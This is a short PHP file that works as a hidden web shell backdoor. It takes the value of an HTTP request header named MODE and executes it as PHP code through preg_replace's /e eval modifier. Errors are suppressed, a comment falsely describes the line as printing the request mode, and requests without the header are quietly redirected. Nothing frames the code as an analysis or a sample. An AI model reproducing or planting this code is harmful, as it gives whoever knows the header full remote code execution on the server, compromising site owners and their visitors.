<?php if(@$_SERVER['HTTP_MODE']){@preg_replace('/mode/e',$_SERVER['HTTP_MODE'],'/* Print the current request mode */');exit;}else{@header('Location: /');} ?>
